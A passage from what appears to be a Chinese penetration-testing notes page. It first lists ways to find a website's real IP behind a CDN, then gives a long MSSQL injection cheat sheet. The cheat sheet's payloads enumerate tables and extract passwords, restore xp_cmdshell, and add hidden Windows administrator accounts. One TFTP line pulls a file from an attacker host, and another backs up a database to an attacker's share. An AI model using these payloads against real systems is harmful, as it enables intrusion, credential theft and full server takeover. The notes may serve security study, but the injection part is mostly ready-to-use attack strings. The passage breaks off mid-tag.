href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><blockquote><p> <a href="http://www.163.com/">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p>非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p><p>​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/">www.163.com</a></p><p>​          <a href="http://www.163.com.lxdns.com/">www.163.com.lxdns.com</a></p></blockquote><p>无 CDN 的示例：</p><blockquote><p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p>非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="0x02-绕过-CDN-查找网站真实-IP"><a href="#0x02-绕过-CDN-查找网站真实-IP" class="headerlink" title="0x02 绕过 CDN 查找网站真实 IP"></a>0x02 绕过 CDN 查找网站真实 IP</h3><h4 id="方法1-查询历史DNS记录"><a href="#方法1-查询历史DNS记录" class="headerlink" title="方法1:查询历史DNS记录"></a>方法1:查询历史DNS记录</h4><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p><p>2）利用<a href="https://securitytrails.com/">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p><p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230838766-860479177.png"></p><p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p><h3 id="方法2-查询子域名"><a href="#方法2-查询子域名" class="headerlink" title="方法2:查询子域名"></a>方法2:查询子域名</h3><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>下面介绍些常用的子域名查找的方法和工具：</p><p>1）微步在线(<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>)</p><p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230922994-1826758810.png"></p><p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>)</p><p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230938207-1237434919.png"></p><p>3）Google 搜索</p><p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230948312-1656865036.png"></p><p>4）各种子域名扫描器</p><p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a>)</p><p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231018377-2070670991.png"></p><p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入Python subdomainbrute.py baidu.com –full即可收集百度的子域名，如图：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231030794-1664451845.png"></p><h3 id="方法3：网络空间引擎搜索法"><a href="#方法3：网络空间引擎搜索法" class="headerlink" title="方法3：网络空间引擎搜索法"></a>方法3：网络空间引擎搜索法</h3><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/">shodan</a>，<a href="https://fofa.so/">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231044976-1731199101.png"></p><h3 id="方法4-利用SSL证书寻找真实原始IP"><a href="#方法4-利用SSL证书寻找真实原始IP" class="headerlink" title="方法4:利用SSL证书寻找真实原始IP"></a>方法4:利用SSL证书寻找真实原始IP</h3><p>使用给定的域名</p><p>假如你在xyz123boot.com上托管了一个服务，原始服务器IP是136.23.63.44。  而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443（<a href="https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。">https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。</a></p><p>此时，如果攻击者扫描0.0.0.0&#x2F;0，即整个互联网，他们就可以在端口443上获取在xyz123boot.com上的有效证书，进而获取提供给你的Web服务器IP。</p><p>目前Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p><p>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。</p><p>xyz123boot.com证书的搜索查询参数为：parsed.names：xyz123boot.com</p><p>只显示有效证书的查询参数为：tags.raw：trusted</p><p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p><p>组合后的搜索参数为：parsed.names: xyz123boot.com and tags.raw: trusted</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231113472-551474696.png"></p><p>Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。</p><p>要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231138538-1845210453.png"></p><p>此时，攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231157237-1457133495.png"></p><p>你可以通过导航到端口443上的IP来验证，看它是否重定向到xyz123boot.com？或它是否直接在IP上显示网站？</p><p>使用给定的SSL证书</p><p>如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。做好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。</p><p>隐藏服务具有SSL证书，要查找它使用的IPv4主机，只需将”SHA1 fingerprint”（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h3><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p><p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p><p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p><p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下：</p><p>80.http.get.headers.server:cloudflare</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231212219-1764707602.png"></p><h3 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h3><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p><p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p><p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p><p>ga（’create’，’UA-93577176-1’，’auto’）;<br> 可以使用80.http.get.body：参数通过body&#x2F;source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p><p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p><p>搜索示例：<a href="https://www.shodan.io/search?query=http.html:UA-32023260-1">https://www.shodan.io/search?query=http.html%3AUA-32023260-1</a></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231222695-1970300973.png"></p><h3 id="方法7-使用国外主机解析域名"><a href="#方法7-使用国外主机解析域名" class="headerlink" title="方法7:使用国外主机解析域名"></a>方法7:使用国外主机解析域名</h3><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="方法8-网站漏洞查找"><a href="#方法8-网站漏洞查找" class="headerlink" title="方法8:网站漏洞查找"></a>方法8:网站漏洞查找</h3><p>1）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br> 2）XSS盲打，命令执行反弹shell，SSRF等。<br> 3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="方法9-网站邮件订阅查找"><a href="#方法9-网站邮件订阅查找" class="headerlink" title="方法9:网站邮件订阅查找"></a>方法9:网站邮件订阅查找</h3><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><h3 id="方法10：用-Zmap-扫全网"><a href="#方法10：用-Zmap-扫全网" class="headerlink" title="方法10：用 Zmap 扫全网"></a>方法10：用 Zmap 扫全网</h3><p>需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。</p><h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><h3 id="方法11：F5-LTM解码法"><a href="#方法11：F5-LTM解码法" class="headerlink" title="方法11：F5 LTM解码法"></a>方法11：F5 LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie:  BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p><h2 id="16-寻找webshell"><a href="#16-寻找webshell" class="headerlink" title="16.寻找webshell"></a>16.寻找webshell</h2><p>1、抓取工具特征流量 2.日志分析  3.webshell查杀工具</p><h2 id="17-sql注入特征"><a href="#17-sql注入特征" class="headerlink" title="17.sql注入特征"></a>17.sql注入特征</h2><h4 id="1-判断有无注入点"><a href="#1-判断有无注入点" class="headerlink" title="1.判断有无注入点"></a>1.判断有无注入点</h4><pre class="line-numbers language-none"><code class="language-none">; and 1&#x3D;1 and 1&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-猜表一般的表的名称无非是admin-adminuser-user-pass-password-等…"><a href="#2-猜表一般的表的名称无非是admin-adminuser-user-pass-password-等…" class="headerlink" title="2.猜表一般的表的名称无非是admin adminuser user pass password 等…"></a>2.猜表一般的表的名称无非是admin adminuser user pass password 等…</h4><pre class="line-numbers language-none"><code class="language-none">and 0&lt;&gt;(select count(*) from *)and 0&lt;&gt;(select count(*) from admin)     --判断是否存在admin这张表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-猜帐号数目"><a href="#3-猜帐号数目" class="headerlink" title="3.猜帐号数目"></a>3.猜帐号数目</h4><pre class="line-numbers language-none"><code class="language-none">如果遇到0&lt; 返回正确页面1&lt;返回错误页面，说明帐号数目就是1个and 0&lt;(select count(*) from admin)and 1&lt;(select count(*) from admin)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-猜解字段名称-在len-括号里面加上我们想到的字段名称"><a href="#4-猜解字段名称-在len-括号里面加上我们想到的字段名称" class="headerlink" title="4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称."></a>4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;(select count(*) from admin where len(*)&gt;0)--and 1&#x3D;(select count(*) from admin where len（用户字段名称name)&gt;0)and 1&#x3D;(select count(*) from admin where len（密码字段名称password)&gt;0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-猜解各个字段的长度-猜解长度就是把-gt-0变换-直到返回正确页面为止"><a href="#5-猜解各个字段的长度-猜解长度就是把-gt-0变换-直到返回正确页面为止" class="headerlink" title="5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止"></a>5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;(select count(*) from admin where len(*)&gt;0)and 1&#x3D;(select count(*) from admin where len(name)&gt;6)            错误and 1&#x3D;(select count(*) from admin where len(name)&gt;5)            正确 长度是6and 1&#x3D;(select count(*) from admin where len(name)&#x3D;6)            正确and 1&#x3D;(select count(*) from admin where len(password)&gt;11)       正确and 1&#x3D;(select count(*) from admin where len(password)&gt;12)       错误 长度是12and 1&#x3D;(select count(*) from admin where len(password)&#x3D;12)       正确<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-猜解字符"><a href="#6-猜解字符" class="headerlink" title="6.猜解字符"></a>6.猜解字符</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;(select count(*) from admin where left(name,1)&#x3D;a) ---猜解用户帐号的第一位and 1&#x3D;(select count(*) from admin where left(name,2)&#x3D;ab)---猜解用户帐号的第二位就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了and 1&#x3D;(select top 1 count(*) from Admin where Asc(mid(pass,5,1))&#x3D;51) --这个查询语句可以猜解中文的用户和密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.group by users. id having 1&#x3D;1--group by users. id,users.username,users.password,users.privs having 1&#x3D;1--; insert into users values( 666,attacker,foobar,0xffff )--UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;logintable-UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;logintable WHERE COLUMN_NAME NOT IN(login_id)-UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;logintable WHERE COLUMN_NAME NOT IN(login_id,login_name)-UNION SELECT TOP 1 login_name FROM logintable-UNION SELECT TOP 1 password FROM logintable where login_name&#x3D;Rahul--看服务器打的补丁&#x3D;出错了打了SP4补丁and 1&#x3D;(select @@VERSION)--看数据库连接账号的权限，返回正常，证明是服务器角色sysadmin权限。and 1&#x3D;(SELECT IS_SRVROLEMEMBER(sysadmin))--判断连接数据库帐号。（采用SA账号连接 返回正常&#x3D;证明了连接账号是SA）and sa&#x3D;(SELECT System_user)--and user_name()&#x3D;dbo--and 0&lt;&gt;(select user_name()--看xp_cmdshell是否删除and 1&#x3D;(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype &#x3D; X AND name &#x3D; xp_cmdshell)--xp_cmdshell被删除，恢复，支持绝对路径的恢复;EXEC master.dbo.sp_addextendedproc xp_cmdshell,xplog70.dll--;EXEC master.dbo.sp_addextendedproc xp_cmdshell,c:\inetpub\wwwroot\xplog70.dll--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="反向PING自己实验"><a href="#反向PING自己实验" class="headerlink" title="#反向PING自己实验"></a>#反向PING自己实验</h5><pre class="line-numbers language-none"><code class="language-none">;use master;declare @s int;exec sp_oacreate &quot;wscript.shell&quot;,@s out;exec sp_oamethod @s,&quot;run&quot;,NULL,&quot;cmd.exe &#x2F;c ping 192.168.0.1&quot;;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="加帐号"><a href="#加帐号" class="headerlink" title="#加帐号"></a>#加帐号</h5><pre class="line-numbers language-none"><code class="language-none">;DECLARE @shell INT EXEC SP_OACREATEwscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C:\WINNT\system32\cmd.exe&#x2F;c net user jiaoniang$ 1866574 &#x2F;add--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="创建一个虚拟目录E盘："><a href="#创建一个虚拟目录E盘：" class="headerlink" title="#创建一个虚拟目录E盘："></a>#创建一个虚拟目录E盘：</h5><pre class="line-numbers language-none"><code class="language-none">;declare @o int exec sp_oacreatewscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\mkwebdir.vbs -w &quot;默认Web站点&quot; -v &quot;e&quot;,&quot;e：\&quot;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="访问属性：（配合写入一个webshell）"><a href="#访问属性：（配合写入一个webshell）" class="headerlink" title="#访问属性：（配合写入一个webshell）"></a>#访问属性：（配合写入一个webshell）</h5><pre class="line-numbers language-none"><code class="language-none">declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\chaccess.vbs -a w3svc&#x2F;1&#x2F;ROOT&#x2F;e +browse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="爆库-特殊技巧：：-5c-x3D-或者把-x2F-和-修改-5提交"><a href="#爆库-特殊技巧：：-5c-x3D-或者把-x2F-和-修改-5提交" class="headerlink" title="#爆库 特殊技巧：：%5c&#x3D;\ 或者把&#x2F;和\ 修改%5提交"></a>#爆库 特殊技巧：：%5c&#x3D;\ 或者把&#x2F;和\ 修改%5提交</h5><pre class="line-numbers language-none"><code class="language-none">and 0&lt;&gt;(select top 1 paths from newtable)--得到库名（从1到5都是系统的id，6以上才可以判断）and 1&#x3D;(select name from master.dbo.sysdatabases where dbid&#x3D;7)--and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid&#x3D;6)依次提交 dbid &#x3D; 7,8,9.... 得到更多的数据库名and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U) 爆到一个表 假设为 adminand 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U and name not in (Admin)) 来得到其他的表。and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype&#x3D;U and name&#x3D;adminand uid&gt;(str(id))) 爆到UID的数值假设为18779569 uid&#x3D;idand 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id&#x3D;18779569) 得到一个admin的一个字段，假设为 user_idand 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id&#x3D;18779569 and name not in(id,...)) 来爆出其他的字段and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名依次可以得到密码。假设存在user_id username,password 等字段and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid&#x3D;6)and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U) 得到表名and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U and name not in(Address))and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype&#x3D;U and name&#x3D;admin and uid&gt;(str(id))) 判断id值and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id&#x3D;773577794) 所有字段id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from adminid&#x3D;-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="得到WEB路径"><a href="#得到WEB路径" class="headerlink" title="#得到WEB路径"></a>#得到WEB路径</h5><pre class="line-numbers language-none"><code class="language-none">;create table [dbo].[swap] ([swappass][char](255));--and (select top 1 swappass from swap)&#x3D;1--;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread@rootkey&#x3D;HKEY_LOCAL_MACHINE,@key&#x3D;SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\,@value_name&#x3D;&#x2F;,values&#x3D;@testOUTPUT insert into paths(path) values(@test)--;use ku1;--;create table cmd (str image);-- 建立image类型的表cmd存在xp_cmdshell的测试过程：;exec master..xp_cmdshell dir;exec master.dbo.sp_addlogin jiaoniang$;-- 加SQL帐号;exec master.dbo.sp_password null,jiaoniang$,1866574;--;exec master.dbo.sp_addsrvrolemember jiaoniang$ sysadmin;--;exec master.dbo.xp_cmdshell net user jiaoniang$ 1866574 &#x2F;workstations:* &#x2F;times:all &#x2F;passwordchg:yes &#x2F;passwordreq:yes&#x2F;active:yes &#x2F;add;--;exec master.dbo.xp_cmdshell net localgroup administrators jiaoniang$ &#x2F;add;--exec master..xp_servicecontrol start,schedule 启动服务exec master..xp_servicecontrol start,server; DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32\cmd.exe &#x2F;c net user jiaoniang$ 1866574 &#x2F;add;DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32\cmd.exe&#x2F;c net localgroup administrators jiaoniang$ &#x2F;add; exec master..xp_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件;declare @a sysname set @a&#x3D;xp_+cmdshell exec @a dir c:\;declare @a sysname set @a&#x3D;xp+_cm’+’dshell exec @a dir c:\;declare @a;set @a&#x3D;db_name();backup database @a to disk&#x3D;你的IP你的共享目录bak.dat如果被限制则可以select * from openrowset(sqloledb,server;sa;,select OK! exec master.dbo.sp_addlogin hax)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="查询构造："><a href="#查询构造：" class="headerlink" title="#查询构造："></a>#查询构造：</h5><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM news WHERE id&#x3D;... AND topic&#x3D;... AND .....adminand 1&#x3D;(select count(*) from [user] where username&#x3D;victim and right(left(userpass,01),1)&#x3D;1) and userpass &lt;&gt;select 123;--;use master;--:a or name like fff%;-- 显示有一个叫ffff的用户哈。and 1&lt;&gt;(select count(email) from [user]);--;update [users] set email&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0) where name&#x3D;ffff;--;update [users] set email&#x3D;(select top 1 id from sysobjects where xtype&#x3D;u and name&#x3D;ad) where name&#x3D;ffff;--;update [users] set email&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and id&gt;581577110) where name&#x3D;ffff;--;update [users] set email&#x3D;(select top 1 count(id) from password) where name&#x3D;ffff;--;update [users] set email&#x3D;(select top 1 pwd from password where id&#x3D;2) where name&#x3D;ffff;--;update [users] set email&#x3D;(select top 1 name from password where id&#x3D;2) where name&#x3D;ffff;--上面的语句是得到数据库中的第一个用户表，并把表名放在ffff用户的邮箱字段中。通过查看ffff的用户资料可得第一个用表叫ad然后根据表名ad得到这个表的ID 得到第二个表的名字insert into users values( 666,char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73),char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73),0xffff)--insert into users values( 667,123,123,0xffff)--insert into users values ( 123,admin--,password,0xffff)--;and user&gt;0;and (select count(*) from sysobjects)&gt;0;and (select count(*) from mysysobjects)&gt;0 &#x2F;&#x2F;为access数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="枚举出数据表名"><a href="#枚举出数据表名" class="headerlink" title="#枚举出数据表名"></a>#枚举出数据表名</h5><pre class="line-numbers language-none"><code class="language-none">;update aaa set aaa&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0);--这是将第一个表名更新到aaa的字段处。读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;；刚才得到的表名）。;update aaa set aaa&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0 and name&lt;&gt;vote);--然后id&#x3D;1552 and exists(select * from aaa where aaa&gt;5)读出第二个表，一个个的读出，直到没有为止。读字段是这样：;update aaa set aaa&#x3D;(select top 1 col_name(object_id（表名），1));--然后id&#x3D;152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名;update aaa set aaa&#x3D;(select top 1 col_name(object_id（表名），2));--然后id&#x3D;152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]update 表名 set 字段&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0 [ and name&lt;&gt;；你得到的表名 查出一个加一个])[ where 条件] select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0 and name not in(table1,table2，…）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号-当前帐号必须是SYSADMIN组"><a href="#通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号-当前帐号必须是SYSADMIN组" class="headerlink" title="###通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]"></a>###通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</h5><h5 id="获得数据表字段名-将字段值更新为字段名，再想法读出这个字段的值就可得到字段名"><a 